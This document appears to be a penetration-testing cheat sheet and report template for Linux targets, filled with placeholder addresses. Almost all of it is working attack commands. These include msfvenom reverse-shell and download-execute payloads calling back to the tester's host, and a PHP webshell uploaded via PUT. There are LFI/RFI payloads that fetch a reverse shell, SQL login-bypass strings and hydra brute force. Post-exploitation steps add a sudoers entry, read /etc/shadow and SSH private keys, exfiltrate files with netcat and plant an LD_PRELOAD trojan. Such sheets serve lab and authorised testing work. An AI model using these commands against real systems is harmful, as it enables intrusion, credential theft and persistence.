# Linux Info Sheet

### Shellcode
```
# Binary
msfvenom -p linux/x86/shell_reverse_tcp LHOST=MYIPADDRESS LPORT=4444 -f elf -o shell.elf
nc -lvnp 4444

# Scripts
msfvenom -p cmd/unix/reverse_python LHOST=MYIPADDRESS LPORT=4444 -f raw -o shell.py
msfvenom -p cmd/unix/reverse_bash  LHOST=MYIPADDRESS LPORT=4444 -f raw -o shell.sh
msfvenom -p cmd/unix/reverse_perl  LHOST=MYIPADDRESS LPORT=4444 -f raw -o shell.pl
nc -lvnp 4444
```

### Webshells
```
# PHP Download Execute
msfvenom -p php/download_exec URL=http://MYIPADDRESS/shell.elf -f raw -o shell.php
msfvenom -p linux/x86/shell_reverse_tcp LHOST=MYIPADDRESS LPORT=443 -f elf > shell.elf
python -m SimpleHTTPServer 80
nc -lvnp 443

# PHP
msfvenom -p php/reverse_php LHOST=MYIPADDRESS LPORT=80 -f raw -o shell.php
*use meterpreter multihandler

Use burp when trying to upload files. Try shell.php.jpeg and change the content type, modify the upload name, or use a nullbyte
shell.php%00.jpeg
```

### Full TCP Scan
INSERTFULLTCPSCAN
```
nmap -sV -Pn -p1-65535 --max-retries 1 --max-scan-delay 10 --defeat-rst-ratelimit --open -T4 INSERTIPADDRESS
```
### Full UDP Scan
INSERTUDPSCAN
```
nmap -Pn -A -sC -sU -T 4 --top-ports 200 INSERTIPADDRESS
```
### Vuln Scan
INSERTVULNSCAN
```
nmap --script=vuln INSERTIPADDRESS
```
### Other scans
```
Always start with a stealthy scan to avoid closing ports.

# Syn-scan
nmap -sS INSERTIPADDRESS

# Connect to udp if one is open
nc -u INSERTIPADDRESS 48772

# Connect to tcp if one is open
nc -nv INSERTIPADDRESS 5472

# Monster scan
nmap INSERTIPADDRESS -p- -A -T4 -sC

```

### Port 21 - FTP
INSERTFTPTEST

```
nmap --script=ftp-anon,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 INSERTIPADDRESS
hydra -I -e ns -l root -P /usr/share/wordlists/rockyou.txt ftp://INSERTIPADDRESS
If anonymous is allowed, apt install ftp 
ftp INSERTIPADDRESS
mput and mget to grab wild card files
```

### Port 22 - SSH
INSERTSSHCONNECT

INSERTSSHBRUTE

```
hydra -I -e ns -l root -P /usr/share/wordlists/rockyou.txt ssh://INSERTIPADDRESS
```

### Port 25 - SMTP
INSERTSMTPCONNECT

```
nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 INSERTIPADDRESS
smtp-user-enum -M RCPT -U /usr/share/wordlists/metasploit/unix_users.txt -t INSERTIPADDRESS
smtp-user-enum -M EXPN -U /usr/share/wordlists/metasploit/unix_users.txt -t INSERTIPADDRESS
smtp-user-enum -M RCPT -U /usr/share/wordlists/metasploit/unix_users.txt -t INSERTIPADDRESS
```

### Port 69 - TFTP
```
nmap -sU -p 69 --script tftp-enum.nse --script-args tftp-enum.filelist=/usr/share/metasploit-framework/data/wordlists/tftp.txt INSERTIPADDRESS
```

### Port 79 - Finger
```
pratator finger_lookup INSERTIPADDRESS
finger @INSERTIPADDRESS
```

### Port 110 - Pop3
INSERTPOP3CONNECT 
```
telnet INSERTIPADDRESS 110
USER pelle@INSERTIPADDRESS
PASS admin
or:
USER pelle
PASS admin
# List all emails
list
stat
# Retrieve email number 5, for example
retr 9
```

### Port 143/993 - Imap
```
nmap -p 143,993 --script imap-brute INSERTIPADDRESS

a1 LOGIN <user> <pass>
a LIST "" "*"
a SELECT INBOX.Sent Items
a4 FETCH 1 BODY[]

hydra -I -e ns -l root -P /usr/share/wordlists/rockyou.txt -s 143 -f INSERTIPADDRESS imap -V
```

### Port 135 - MSRPC
INSERTRPCMAP

### Port 111 - Rpcbind
```
rpcinfo -p INSERTIPADDRESS
```

### Port 139/445 
INSERTSMBMAP

```
mkdir /tmp/share
mount -t cifs //INSERTIPADDRESS/C$ /tmp/share
```
### Password Policy
INSERTSAMRDUMP

```
https://blog.ropnop.com/using-credentials-to-own-windows-boxes/
enum4linux -a INSERTIPADDRESS
rpcclient -U "" INSERTIPADDRESS
smbclient //INSERTIPADDRESS/ipc$ 
```

### Port 161/162 UDP - SNMP
INSERTSNMPSCAN

```
Look for installed programs and other ports that are opened and may have been missed

nmap -vv -sV -sU -Pn -p 161,162 --script=snmp-netstat,snmp-processes INSERTIPADDRESS
onesixtyone -c /root/Dropbox/Wordlists/wordlist-common-snmp-community-strings.txt INSERTIPADDRESS
snmp-check INSERTIPADDRESS -c public
# Common community strings
public
private
community
```

### Port 389 - LDAP
```
Will change depending on binding mode, with anonymous binding though...

nmap -p 389 --script ldap-search INSERTIPADDRESS
nmap -p 389 --script ldap-brute INSERTIPADDRESS
```

### Port 443 - HTTPS
INSERTSSLSCAN

```
sslscan INSERTIPADDRESS:443
```

### Port 1030/1032/1033/1038
Used by RPC to connect in domain network.

### Port 1521 - Oracle

- Name:
- Version:
- Password protected:

```
tnscmd10g version -h INSERTIPADDRESS
tnscmd10g status -h INSERTIPADDRESS
```

### Port 2049 - NFS
INSERTNFSSCAN

```
showmount -e INSERTIPADDRESS
If you find anything you can mount it like this:
mount INSERTIPADDRESS:/ /tmp/NFS
mount -t INSERTIPADDRESS:/ /tmp/NFS
```

### Port 2100 - Oracle XML DB

- Name:
- Version:
- Default logins:

```
sys:sys
scott:tiger

Default passwords
https://docs.oracle.com/cd/B10501_01/win.920/a95490/username.htm
```

### 3306 - MySQL

- Name:
- Version:

```
nmap --script=mysql-databases.nse,mysql-empty-password.nse,mysql-enum.nse,mysql-info.nse,mysql-variables.nse,mysql-vuln-cve2012-2122.nse INSERTIPADDRESS -p 3306

mysql --host=INSERTIPADDRESS -u root -p
```

### Port 3339 - Oracle web interface

- Basic info about web service (apache, nginx, IIS)
- Server:
- Scripting language:
- Apache Modules:
- IP-address:

## Webservers 

### Automated Checks
INSERTWIGSCAN

INSERTWIGSSLSCAN
```
wig-git -t 50 -q -d http://INSERTIPADDRESS/path

uniscan -f /usr/share/wordlists/dir/big.txt -bqweds -u http://INSERTIPADDRESS/path
```
### Nikto scan
INSERTNIKTOSCAN
```
# Full Nikto
nikto -h http://INSERTIPADDRESS

# Nikto with squid proxy
nikto -h INSERTIPADDRESS -useproxy http://INSERTIPADDRESS:4444
```
### Directories
INSERTDIRBSCAN

INSERTDIRBSSLSCAN
```
# Common directories and extensions
gobuster dir --url http://INSERTIPADDRESS -e -n -w /usr/share/wordlists/dirb/common.txt -t 100 -x .php,.asp,.html,.pl,.js,.py,.aspx,.htm,.xhtml

# Most directories and extension
gobuster dir --url http://INSERTIPADDRESS -e -n -f -w /usr/share/wordlists/dirb/big.txt -t 100 -x .asp,.aspx,.bat,.c,.cfm,.cgi,.com,.dll,.exe,.htm,.html,.inc,.jhtml,.jsa,.jsp,.log,.mdb,.nsf,.php,.phtml,.pl,.reg,.sh,.shtml,.sql,.txt,.xml

```
### Robots
INSERTROBOTS

### Webapp Firewall
INSERTWAFSCAN

INSERTWAFSSLSCAN
```
wafw00f http://INSERTIPADDRESS/path -a
```

### Default/Weak login
Google documentation for default passwords and test them:
```
http://open-sez.me/
https://cirt.net/passwords
```

### Find sploits - Searchsploit and google
Where there are many exploits for a software, use google. It will automatically sort it by popularity.
```
site:exploit-db.com apache 2.4.7

# Remove dos-exploits

searchsploit Apache 2.4.7 | grep -v '/dos/'
searchsploit Apache | grep -v '/dos/' | grep -vi "tomcat"

# Only search the title (exclude the path), add the -t
searchsploit -t Apache | grep -v '/dos/'
```

### Manual Checks
```
Step 1:
View Source/Page for PII

Step 2: 
# Start Secondary Scans

# Get header and page
curl -i -L INSERTIPADDRESS

# Check if it is possible to upload using put
curl --user login:password --upload-file your.file.txt http://INSERTIPADDRES
curl -v -X OPTIONS http://INSERTIPADDRESS/
curl -v -X PUT -d '<?php system($_GET["cmd"]); ?>' http://INSERTIPADDRESS/test/shell.php

# User-agent test
ua-tester -u http://INSERTIPADDRESS -d MDCTB

# Check for title and all links
dotdotpwn.pl -m http -h INSERTIPADDRESS -M GET -o unix

Step 3:
Burp
Send page to repeater
  Look for headers that can be fuzzed
  ID= that can be changed
Send cookies to sequencer
Send curious strings to decrypter
```

### LFI/RFI

```
fimap -u "http://INSERTIPADDRESS/example.php?test="
http://kaoticcreations.blogspot.com/2011/08/automated-lfirfi-scanning-exploiting.html

# Checks
http://INSERTIPADDRESS/gallery.php?page=/etc/passwd
http://INSERTIPADDRESS/gallery.php?page=/etc/passwd%00

http://INSERTIPADDRESS/gallery.php?page=../../../../../../etc/passwd
http://INSERTIPADDRESS/gallery.php?page=../../../../../../etc/passwd%00

http://INSERTIPADDRESS/gallery.php?page=expect://ls
*If you get a warning include() error it is not affected
Else for shell:
POST this with tamper data to http://INSERTIPADDRESS/gallery.php?page=expect://ls
<? system('wget http://10.11.0.150/php-reverse-shell.php -O /var/www/shell.php');?>
Then navigate to
http://INSERTIPADDRESS/shell.php

# Bypass execution
http://INSERTIPADDRESS/index.php?page=php://filter/convert.base64-encode/resource=../../../../../etc/passwd
base64 -d output of above

# Remote File Inclusion
python -m SimpleHTTPServer 80
http://INSERTIPADDRESS/page=http://MYIPADDRESS/maliciousfile.php%00
http://INSERTIPADDRESS/page=http://MYIPADDRESS/maliciousfile.php
```

### Sql-login-bypass

```
# Login Bypass Checks
Username/Password: 
1' or '1'='1 
1' or 1=1 LIMIT 1;# 
'or 1=1/*
'or '1'='1' --
'or '1'='1' ({
'or '1'='1' /*

# Automated
- Open Burp-suite
- Make and intercept request
- Send to intruder
- Cluster attack
- Paste in sqlibypass-list (https://bobloblaw.gitbooks.io/security/content/sql-injections.html)
- Attack
- Check for response length variation
```

### SQL-Injection

```
# Post
get post request from Burp and save as search-test.txt
sqlmap -r search-test.txt -p tfUPass

# Get
sqlmap -u "http://INSERTIPADDRESS/index.php?id=1" --dbms=mysql

# Crawl
sqlmap -u http://INSERTIPADDRESS --dbms=mysql --crawl=3
```

### WebDav

```
cadaver INSERTIPADDRESS
Try to put a shell.php

cd /root/Dropbox/Engagements/INSERTIPADDRESS/exploit && msfvenom -p linux/x86/shell_reverse_tcp LHOST=MYIPADDRESS LPORT=443 -f php -o shell.php

put /root/Dropbox/Engagements/INSERTIPADDRESS/exploit/shell.php
If the .asp extention is not allowed, try shell.asp.txt and use the mv command

user: wampp
pass: xampp 
```

### Password brute force - last resort

```
cewl http://INSERTIPADDRESS
```
----------------------------------------------------------------------------


-----------------------------------------------------------------------------
#Privesc

### First Steps

```
# Jail Break
https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells

# Spawning shell
python -c 'import pty; pty.spawn("/bin/sh")'

# Access to more binaries
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# Add user to sudoers
echo "hacker ALL=(ALL:ALL) ALL" >> /etc/sudoers

# Writable directories
/tmp
/var/tmp
Find a writable directory:
find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print
find / -user <user>

# Run as another user
sudo - user -c 'ls'
runuser -l user -c 'ls'

# Set up webserver
cd /root/Dropbox/Scripts/Post_Linux/Host_Scripts; python -m SimpleHTTPServer 8080

# Download all files
wget http://MYIPADDRESS:8080/ -r; mv MYIPADDRESS:8080 exploits; cd exploits; rm index.html; chmod 700 LinEnum.sh linuxprivchecker.py unix-privesc-check mimipenguin.sh mimipenguin.py

mkdir checks; ./LinEnum.sh -t -k password > checks/linenum && python linuxprivchecker.py extended > checks/linuxpriv && ./unix-privesc-check standard > checks/unixpriv &

#Uploads Files
Host:
cd /root/Dropbox/Engagments/INSERTIPADDRESS/privesc; nc -lvnp 80 > checks.tar.gz

Target:
tar -zcvf checks.tar.gz checks ;nc -w 3 MYIPADDRESS 80 < checks.tar.gz

Host:
tar xvzf checks.tar.gz

```


### Basic info

```
uname -a
env
id
cat /proc/version
cat /etc/issue
cat /etc/passwd
cat /etc/group
cat /etc/shadow
cat /etc/hosts
```

- OS:
- Version:
- Kernel version:
- Architecture:
- Current user:

**Devtools:**
- GCC:
- NC:
- WGET:

### Kernel exploits

```
cd /root/Dropbox/Engagements/INSERTIPADDRESS/exploits && python -m SimpleHTTPServer 80
wget http://MYIPADDRESS/<name>

site:exploit-db.com kernel version

perl /root/Dropbox/Scripts/Post_Linux/linux-exploit-suggester-2/linux-exploit-suggester-2.pl -k 2.6
python /root/Dropbox/Scripts/Post_Linux/AutoLocalPrivilegeEscalation/auto_searchsploit.py 2.6
```

### Programs running as root

Look for webserver, mysql or anything else like that.

```
# Metasploit
ps

# Linux
ps aux
```

### Installed software

```
/usr/local/
/usr/local/src
/usr/local/bin
/opt/
/home
/var/
/usr/src/

# Debian
dpkg -l

# CentOS, OpenSuse, Fedora, RHEL
rpm -qa (CentOS / openSUSE )

# OpenBSD, FreeBSD
pkg_info
```


### Weak/reused/plaintext passwords

- Check database config-file
- Check databases
- Check weak passwords

```
username:username
username:username1
username:root
username:admin
username:qwerty
username:password
```

- Check plaintext

```
./LinEnum.sh -t -k password 
username
mysql_user
```

### Inside service

```
netstat -anlp
```

### Suid misconfiguration

Binary with suid permission can be run by anyone, but when they are run they are run as root! Editors like nano can then be used to open and edit the /etc/passwd file.

Any of these can be exploited:

```
nmap (nmap --interactive)
vim
nano
find
bash
more
Less
cp
```

```
find / -perm -u=s -type f 2>/dev/null
```


### Unmounted filesystems

Here we are looking for any unmounted filesystems. If we find one we mount it and start the priv-esc process over again.

```
mount -l
mkdir /media/newhd
mount /dev/sdb1 /media/newhd
cd /media/newhd
```

### Cronjob

Look for anything that is owned by privileged user but writable for you

```
crontab -l
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root
```

### SSH Keys

Check all home directories

```
cat ~/.ssh/authorized_keys
cat ~/.ssh/identity.pub
cat ~/.ssh/identity
cat ~/.ssh/id_rsa.pub
cat ~/.ssh/id_rsa
cat ~/.ssh/id_dsa.pub
cat ~/.ssh/id_dsa
cat /etc/ssh/ssh_config
cat /etc/ssh/sshd_config
cat /etc/ssh/ssh_host_dsa_key.pub
cat /etc/ssh/ssh_host_dsa_key
cat /etc/ssh/ssh_host_rsa_key.pub
cat /etc/ssh/ssh_host_rsa_key
cat /etc/ssh/ssh_host_key.pub
cat /etc/ssh/ssh_host_key
```

### Bad path configuration

Requires user interaction

### Trojan Libraries
```
For persistance and potential privesc on older distros --

msfvenom -p linux/x64/mettle/reverse_tcp LHOST=INSERTIPADDRESS -f elf-so -o mettle.so
On victim:
export LD_PRELOAD=/mettle.so; ls

Check for libraries that can be intercepted:
ldd /usr/bin/app
LD_PRELOAD or LD_LIBRARY_PATH loaded before /lib
env | grep 'LD_\|RTL_'
```

------------------------------------------------------------------------




----------------------------- LOOT LOOT LOOT LOOT ----------------------




------------------------------------------------------------------------

## Loot

**Checklist**

- Proof:
- Network secret:
- Passwords and hashes:
- Dualhomed:
- Tcpdump:
- Interesting files:
- Databases:
- SSH-keys:
- Browser:
- Mail:


### Proof

```
/root/proof.txt
```

### Network secret

```
/root/network-secret.txt
```

### Passwords and hashes

```
cat /etc/passwd
cat /etc/shadow

unshadow passwd shadow > unshadowed.txt
john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
```

### Dualhomed

```
ifconfig
ifconfig -a
arp -a
```

### Tcpdump

```
tcpdump -i any -s0 -w capture.pcap
tcpdump -i eth0 -w capture -n -U -s 0 src not 192.168.1.X and dst not 192.168.1.X
tcpdump -vv -i eth0 src not 192.168.1.X and dst not 192.168.1.X
```

### Interesting files

```
#Meterpreter
search -f *.txt
search -f *.zip
search -f *.doc
search -f *.xls
search -f config*
search -f *.rar
search -f *.docx
search -f *.sql

.ssh:
.bash_history
```

### Databases

### SSH-Keys

### Browser

### Mail
```
/var/mail
/var/spool/mail
```

### GUI
If there is a gui we want to check out the browser.

```
echo $DESKTOP_SESSION
echo $XDG_CURRENT_DESKTOP
echo $GDMSESSION
```
